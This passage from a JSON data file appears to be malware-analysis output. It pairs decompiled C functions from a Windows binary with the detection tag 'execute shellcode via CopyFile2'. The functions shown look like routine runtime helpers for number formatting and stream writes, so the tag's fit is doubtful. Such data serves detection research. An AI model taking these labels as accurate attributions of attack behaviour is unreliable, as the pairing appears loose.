        "decompiled_code": "\nvoid __cdecl fcn.0040222a(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    iVar2 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar2 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00403acb();\n    iVar1 = iVar2 + iVar1 * 2 + -2;\n    *(in_ECX + 0x34) = iVar1;\n    iVar2 = iVar1;\n    while ((0 < *(in_ECX + 0x28) || (arg_8h != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        uVar3 = arg_8h % arg_ch + 0x30 & 0xffff;\n        if (0x39 < uVar3) {\n            uVar3 = (arg_10h ^ 1) * ' ' + '\\a' + uVar3;\n        }\n        **(in_ECX + 0x34) = uVar3;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n        iVar2 = *(in_ECX + 0x34);\n        arg_8h = arg_8h / arg_ch;\n    }\n    *(in_ECX + 0x38) = iVar1 - iVar2 >> 1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 2;\n    return;\n}\n",
        "token_count": 396
    },
    "004026b7": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nchar __fastcall fcn.004026b7(uint *param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *arg_8h;\n    uint *puVar3;\n    uint32_t var_4h;\n    \n    var_4h = param_1 & 0xffff0000;\n    *(param_1 + 0xf) = 1;\n    cVar1 = fcn.004032e2(&var_4h);\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.004058f8();\n        if (cVar1 != '\\0') {\n            puVar3 = param_1 + 0x10;\n            cVar1 = fcn.00401889(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n            arg_8h = param_1[0x111];\n            if (cVar1 == '\\0') {\n                var_4h = var_4h & 0xffff00ff;\n                if (arg_8h == NULL) {\n                    arg_8h = puVar3;\n                }\n                iVar2 = fcn.0040105f(arg_8h, &var_4h, *(*param_1[2] + 4), param_1[2]);\n                if (iVar2 < 0) {\n                    *(param_1 + 0xc) = 1;\n                }\n            }\n            else {\n                if (arg_8h == NULL) {\n                    arg_8h = puVar3;\n                }\n                *arg_8h = var_4h;\n            }\n            if (param_1[0x111] != NULL) {\n                puVar3 = param_1[0x111];\n            }\n            param_1[0xd] = puVar3;\n            param_1[0xe] = 1;\n        }\n        cVar1 = '\\x01';\n    }\n    return cVar1;\n}\n",
        "token_count": 449
    },
    "00402af9": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402af9(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    char extraout_CL;\n    char cVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = CONCAT44(arg_ch, arg_8h);\n    iVar3 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar3 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00405911();\n    iVar3 = iVar3 + iVar1 + -1;\n    *(in_ECX + 0x34) = iVar3;\n    iVar1 = iVar3;\n    while ((0 < *(in_ECX + 0x28) || (iVar4 != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        iVar4 = fcn.00401820(iVar4, arg_10h, 0, iVar4 >> 0x20);\n        cVar2 = extraout_CL + '0';\n        if ('9' < cVar2) {\n            cVar2 = cVar2 + (arg_14h ^ 1) * ' ' + '\\a';\n        }\n        **(in_ECX + 0x34) = cVar2;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        iVar1 = *(in_ECX + 0x34);\n    }\n    *(in_ECX + 0x38) = iVar3 - iVar1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    return;\n}\n",
        "token_count": 433
    },
    "00402d24": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402d24(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    char cVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar3 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00405911();\n    iVar3 = iVar3 + iVar1 + -1;\n    *(in_ECX + 0x34) = iVar3;\n    iVar1 = iVar3;\n    while ((0 < *(in_ECX + 0x28) || (arg_8h != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        cVar2 = arg_8h % arg_ch + '0';\n        if ('9' < cVar2) {\n            cVar2 = cVar2 + (arg_10h ^ 1) * ' ' + '\\a';\n        }\n        **(in_ECX + 0x34) = cVar2;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        iVar1 = *(in_ECX + 0x34);\n        arg_8h = arg_8h / arg_ch;\n    }\n    *(in_ECX + 0x38) = iVar3 - iVar1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    return;\n}\n",
        "token_count": 380
    },
    "00402fa4": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00402fa4(uint *param_1)\n\n{\n    char cVar1;\n    uint32_t arg_14h;\n    uint arg_10h;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint arg_18h;\n    \n    puVar4 = param_1 + 0x10;\n    cVar1 = fcn.00404737(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = puVar4;\n        }\n        param_1[5] = param_1[5] + 4;\n        *puVar3 = *(param_1[5] + -4);\n        param_1[0xe] = 1;\n    }\n    else {\n        param_1[5] = param_1[5] + 4;\n        arg_14h = *(param_1[5] + -4);\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = puVar4;\n        }\n        arg_18h = param_1[2];\n        arg_10h = fcn.00405911();\n        iVar2 = fcn.00401f32(param_1 + 0xe, puVar3, arg_10h, arg_14h, arg_18h);\n        if (iVar2 != 0) {\n            *(param_1 + 0xc) = 1;\n        }\n    }\n    puVar3 = param_1[0x111];\n    if (puVar3 != NULL) {\n        puVar4 = puVar3;\n    }\n    param_1[0xd] = puVar4;\n    return CONCAT31(puVar3 >> 8, 1);\n}\n",
        "token_count": 452
    },
    "0040316b": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040316b(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    iVar2 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar2 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00403acb();\n    iVar1 = iVar2 + iVar1 * 2 + -2;\n    *(in_ECX + 0x34) = iVar1;\n    iVar2 = iVar1;\n    while ((0 < *(in_ECX + 0x28) || (arg_8h != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        uVar3 = arg_8h % arg_ch + 0x30 & 0xffff;\n        if (0x39 < uVar3) {\n            uVar3 = (arg_10h ^ 1) * ' ' + '\\a' + uVar3;\n        }\n        **(in_ECX + 0x34) = uVar3;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n        iVar2 = *(in_ECX + 0x34);\n        arg_8h = arg_8h / arg_ch;\n    }\n    *(in_ECX + 0x38) = iVar1 - iVar2 >> 1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 2;\n    return;\n}\n",
        "token_count": 396
    },
    "004033af": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004033af(uint *param_1)\n\n{\n    char cVar1;\n    uint arg_10h;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t arg_14h;\n    uint arg_18h;\n    uint *var_4h;\n    \n    var_4h = param_1;\n    cVar1 = fcn.00404737(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = param_1 + 0x10;\n        }\n        cVar1 = fcn.00404160(puVar3);\n        if (cVar1 == '\\0') {\n            return 0;\n        }\n        cVar1 = fcn.00405128();\n        if (cVar1 == '\\0') {\n            return 1;\n        }\n        param_1[0xe] = 1;\n    }\n    else {\n        var_4h = var_4h & 0xffff0000;\n        cVar1 = fcn.00402d06(&var_4h);\n        if (cVar1 == '\\0') {\n            return 0;\n        }\n        cVar1 = fcn.00405128();\n        if (cVar1 == '\\0') {\n            return 1;\n        }\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = param_1 + 0x10;\n        }\n        arg_18h = param_1[2];\n        arg_14h = var_4h;\n        arg_10h = fcn.00405911();\n        iVar2 = fcn.00401f32(param_1 + 0xe, puVar3, arg_10h, arg_14h, arg_18h);\n        if (iVar2 != 0) {\n            *(param_1 + 0xc) = 1;\n        }\n    }\n    puVar3 = param_1 + 0x10;\n    if (param_1[0x111] != NULL) {\n        puVar3 = param_1[0x111];\n    }\n    param_1[0xd] = puVar3;\n    return 1;\n}\n",
        "token_count": 546
    },
    "0040386e": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid __fastcall fcn.0040386e(int32_t *param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t var_28h;\n    uint var_24h;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    if ((param_1[0xe] != 0) && (*(param_1 + 0x3d) != '\\0')) {\n        pcVar1 = *(*param_1 + 0xc);\n        (**0x573000)(0xffffffff);\n        iVar2 = (*pcVar1)();\n        if (iVar2 != -1) {\n            pcVar1 = *(*param_1[0xe] + 0x20);\n            (**0x573000)(param_1 + 0x10, &var_24h, &var_4h, &var_28h);\n            iVar2 = (*pcVar1)();\n            if (iVar2 == 0) {\n                *(param_1 + 0x3d) = 0;\n            }\n            else if (iVar2 != 1) {\n                if (iVar2 == 3) {\n                    *(param_1 + 0x3d) = 0;\n                }\n                goto code_r0x004604cb;\n            }\n            iVar2 = var_28h - &var_24h;\n            if (iVar2 != 0) {\n                fcn.00401fc3(&var_24h, 1, iVar2, param_1[0x13]);\n            }\n        }\n    }\ncode_r0x004604cb:\n    fcn.00403085(var_28h);\n    return;\n}\n",
        "token_count": 393
    },
    "00403aee": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403aee(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    char extraout_CL;\n    char cVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = CONCAT44(arg_ch, arg_8h);\n    iVar3 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar3 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00405911();\n    iVar3 = iVar3 + iVar1 + -1;\n    *(in_ECX + 0x34) = iVar3;\n    iVar1 = iVar3;\n    while ((0 < *(in_ECX + 0x28) || (iVar4 != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        iVar4 = fcn.00401820(iVar4, arg_10h, 0, iVar4 >> 0x20);\n        cVar2 = extraout_CL + '0';\n        if ('9' < cVar2) {\n            cVar2 = cVar2 + (arg_14h ^ 1) * ' ' + '\\a';\n        }\n        **(in_ECX + 0x34) = cVar2;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        iVar1 = *(in_ECX + 0x34);\n    }\n    *(in_ECX + 0x38) = iVar3 - iVar1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    return;\n}\n",
        "token_count": 433
    },
    "00403dd2": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403dd2(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    char cVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar3 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00405911();\n    iVar3 = iVar3 + iVar1 + -1;\n    *(in_ECX + 0x34) = iVar3;\n    iVar1 = iVar3;\n    while ((0 < *(in_ECX + 0x28) || (arg_8h != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        cVar2 = arg_8h % arg_ch + '0';\n        if ('9' < cVar2) {\n            cVar2 = cVar2 + (arg_10h ^ 1) * ' ' + '\\a';\n        }\n        **(in_ECX + 0x34) = cVar2;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        iVar1 = *(in_ECX + 0x34);\n        arg_8h = arg_8h / arg_ch;\n    }\n    *(in_ECX + 0x38) = iVar3 - iVar1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    return;\n}\n",
        "token_count": 380
    },
    "00403f26": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403f26(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    iVar2 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar2 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00403acb();\n    iVar1 = iVar2 + iVar1 * 2 + -2;\n    *(in_ECX + 0x34) = iVar1;\n    iVar2 = iVar1;\n    while ((0 < *(in_ECX + 0x28) || (arg_8h != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        uVar3 = arg_8h % arg_ch + 0x30 & 0xffff;\n        if (0x39 < uVar3) {\n            uVar3 = (arg_10h ^ 1) * ' ' + '\\a' + uVar3;\n        }\n        **(in_ECX + 0x34) = uVar3;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n        iVar2 = *(in_ECX + 0x34);\n        arg_8h = arg_8h / arg_ch;\n    }\n    *(in_ECX + 0x38) = iVar1 - iVar2 >> 1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 2;\n    return;\n}\n",
        "token_count": 396
    },
    "00404007": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00404007(uint *param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *var_4h;\n    \n    param_1[5] = param_1[5] + 4;\n    puVar4 = param_1 + 0x10;\n    *(param_1 + 0xf) = 1;\n    var_4h._0_2_ = *(param_1[5] + -4);\n    var_4h = param_1;\n    cVar1 = fcn.00401889(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        var_4h._0_2_ = var_4h & 0xff;\n        var_4h = var_4h & 0xffff0000 | var_4h;\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = puVar4;\n        }\n        iVar2 = fcn.0040105f(puVar3, &var_4h, *(*param_1[2] + 4), param_1[2]);\n        if (iVar2 < 0) {\n            *(param_1 + 0xc) = 1;\n        }\n    }\n    else {\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = puVar4;\n        }\n        *puVar3 = var_4h;\n    }\n    puVar3 = param_1[0x111];\n    if (puVar3 != NULL) {\n        puVar4 = puVar3;\n    }\n    param_1[0xd] = puVar4;\n    param_1[0xe] = 1;\n    return CONCAT31(puVar3 >> 8, 1);\n}\n",
        "token_count": 469
    },
    "004040e3": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004040e3(uint *param_1)\n\n{\n    char cVar1;\n    uint32_t arg_14h;\n    uint arg_10h;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint arg_18h;\n    \n    puVar4 = param_1 + 0x10;\n    cVar1 = fcn.00404737(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = puVar4;\n        }\n        param_1[5] = param_1[5] + 4;\n        *puVar3 = *(param_1[5] + -4);\n        param_1[0xe] = 1;\n    }\n    else {\n        param_1[5] = param_1[5] + 4;\n        arg_14h = *(param_1[5] + -4);\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = puVar4;\n        }\n        arg_18h = param_1[2];\n        arg_10h = fcn.00405911();\n        iVar2 = fcn.00401f32(param_1 + 0xe, puVar3, arg_10h, arg_14h, arg_18h);\n        if (iVar2 != 0) {\n            *(param_1 + 0xc) = 1;\n        }\n    }\n    puVar3 = param_1[0x111];\n    if (puVar3 != NULL) {\n        puVar4 = puVar3;\n    }\n    param_1[0xd] = puVar4;\n    return CONCAT31(puVar3 >> 8, 1);\n}\n",
        "token_count": 452
    },
    "004041f6": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004041f6(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    char extraout_CL;\n    char cVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = CONCAT44(arg_ch, arg_8h);\n    iVar3 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar3 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00405911();\n    iVar3 = iVar3 + iVar1 + -1;\n    *(in_ECX + 0x34) = iVar3;\n    iVar1 = iVar3;\n    while ((0 < *(in_ECX + 0x28) || (iVar4 != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        iVar4 = fcn.00401820(iVar4, arg_10h, 0, iVar4 >> 0x20);\n        cVar2 = extraout_CL + '0';\n        if ('9' < cVar2) {\n            cVar2 = cVar2 + (arg_14h ^ 1) * ' ' + '\\a';\n        }\n        **(in_ECX + 0x34) = cVar2;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        iVar1 = *(in_ECX + 0x34);\n    }\n    *(in_ECX + 0x38) = iVar3 - iVar1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    return;\n}\n",
        "token_count": 433
    },
    "00404291": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nchar __fastcall fcn.00404291(uint *param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *arg_8h;\n    uint *puVar3;\n    uint32_t var_4h;\n    \n    var_4h = param_1 & 0xffff0000;\n    *(param_1 + 0xf) = 1;\n    cVar1 = fcn.00403f5d(&var_4h);\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.00404278();\n        if (cVar1 != '\\0') {\n            puVar3 = param_1 + 0x10;\n            cVar1 = fcn.00401889(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n            arg_8h = param_1[0x111];\n            if (cVar1 == '\\0') {\n                var_4h = var_4h & 0xffff00ff;\n                if (arg_8h == NULL) {\n                    arg_8h = puVar3;\n                }\n                iVar2 = fcn.0040105f(arg_8h, &var_4h, *(*param_1[2] + 4), param_1[2]);\n                if (iVar2 < 0) {\n                    *(param_1 + 0xc) = 1;\n                }\n            }\n            else {\n                if (arg_8h == NULL) {\n                    arg_8h = puVar3;\n                }\n                *arg_8h = var_4h;\n            }\n            if (param_1[0x111] != NULL) {\n                puVar3 = param_1[0x111];\n            }\n            param_1[0xd] = puVar3;\n            param_1[0xe] = 1;\n        }\n        cVar1 = '\\x01';\n    }\n    return cVar1;\n}\n",
        "token_count": 448
    },
    "00404304": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404304(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    char extraout_CL;\n    char cVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = CONCAT44(arg_ch, arg_8h);\n    iVar3 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar3 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00405911();\n    iVar3 = iVar3 + iVar1 + -1;\n    *(in_ECX + 0x34) = iVar3;\n    iVar1 = iVar3;\n    while ((0 < *(in_ECX + 0x28) || (iVar4 != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        iVar4 = fcn.00401820(iVar4, arg_10h, 0, iVar4 >> 0x20);\n        cVar2 = extraout_CL + '0';\n        if ('9' < cVar2) {\n            cVar2 = cVar2 + (arg_14h ^ 1) * ' ' + '\\a';\n        }\n        **(in_ECX + 0x34) = cVar2;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        iVar1 = *(in_ECX + 0x34);\n    }\n    *(in_ECX + 0x38) = iVar3 - iVar1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    return;\n}\n",
        "token_count": 432
    },
    "00461157": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n\nvoid __cdecl fcn.00461157(uint32_t arg_8h)\n\n{\n    uchar *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint32_t extraout_ECX;\n    uint32_t uVar4;\n    uint arg_ch;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t *var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    if (arg_8h != 0xffffffff) {\n        uVar4 = **(in_ECX + 0x20);\n        if (uVar4 != 0) {\n            iVar3 = **(in_ECX + 0x30);\n            if (uVar4 < iVar3 + uVar4) {\n                **(in_ECX + 0x30) = iVar3 + -1;\n                puVar1 = **(in_ECX + 0x20);\n                **(in_ECX + 0x20) = puVar1 + 1;\n                *puVar1 = arg_8h;\n                goto code_r0x00461251;\n            }\n        }\n        if (*(in_ECX + 0x4c) != 0) {\n            fcn.004036cf();\n            var_2ch = *(in_ECX + 0x38);\n            if (var_2ch == NULL) {\n                arg_ch = *(in_ECX + 0x4c);\n                uVar4 = extraout_ECX & 0xffffff00 | arg_8h & 0xff;\n            }\n            else {\n                var_28h = var_28h & 0xffffff00 | arg_8h & 0xff;\n                pcVar2 = *(*var_2ch + 0x1c);\n                (**0x573000)(in_ECX + 0x40, &var_28h, &var_28h + 1, &var_34h, &var_24h, &var_4h, &var_30h);\n                iVar3 = (*pcVar2)();\n                if ((iVar3 == 0) || (iVar3 == 1)) {\n                    var_30h = var_30h - &var_24h;\n                    if ((var_30h == 0) ||\n                       (iVar3 = fcn.00401fc3(&var_24h, 1, var_30h, *(in_ECX + 0x4c)),  var_30h == iVar3)) {\n                        *(in_ECX + 0x3d) = 1;\n                    }\n                    goto code_r0x00461251;\n                }\n                if (iVar3 != 3) goto code_r0x00461251;\n                arg_ch = *(in_ECX + 0x4c);\n                uVar4 = var_28h;\n            }\n            fcn.00402f27(uVar4, arg_ch);\n        }\n    }\ncode_r0x00461251:\n    fcn.00403085(var_34h);\n    return;\n}\n",
        "token_count": 722
    },
    "00404bdd": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00404bdd(uint *param_1)\n\n{\n    char cVar1;\n    uint32_t arg_14h;\n    uint arg_10h;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint arg_18h;\n    \n    puVar4 = param_1 + 0x10;\n    cVar1 = fcn.00404737(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = puVar4;\n        }\n        param_1[5] = param_1[5] + 4;\n        *puVar3 = *(param_1[5] + -4);\n        param_1[0xe] = 1;\n    }\n    else {\n        param_1[5] = param_1[5] + 4;\n        arg_14h = *(param_1[5] + -4);\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = puVar4;\n        }\n        arg_18h = param_1[2];\n        arg_10h = fcn.00405911();\n        iVar2 = fcn.00401f32(param_1 + 0xe, puVar3, arg_10h, arg_14h, arg_18h);\n        if (iVar2 != 0) {\n            *(param_1 + 0xc) = 1;\n        }\n    }\n    puVar3 = param_1[0x111];\n    if (puVar3 != NULL) {\n        puVar4 = puVar3;\n    }\n    param_1[0xd] = puVar4;\n    return CONCAT31(puVar3 >> 8, 1);\n}\n",
        "token_count": 451
    },
    "00404e80": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00404e80(uint *param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *var_4h;\n    \n    param_1[5] = param_1[5] + 4;\n    puVar4 = param_1 + 0x10;\n    *(param_1 + 0xf) = 1;\n    var_4h._0_2_ = *(param_1[5] + -4);\n    var_4h = param_1;\n    cVar1 = fcn.00401889(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        var_4h._0_2_ = var_4h & 0xff;\n        var_4h = var_4h & 0xffff0000 | var_4h;\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = puVar4;\n        }\n        iVar2 = fcn.0040105f(puVar3, &var_4h, *(*param_1[2] + 4), param_1[2]);\n        if (iVar2 < 0) {\n            *(param_1 + 0xc) = 1;\n        }\n    }\n    else {\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = puVar4;\n        }\n        *puVar3 = var_4h;\n    }\n    puVar3 = param_1[0x111];\n    if (puVar3 != NULL) {\n        puVar4 = puVar3;\n    }\n    param_1[0xd] = puVar4;\n    param_1[0xe] = 1;\n    return CONCAT31(puVar3 >> 8, 1);\n}\n",
        "token_count": 470
    },
    "00404e8f": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
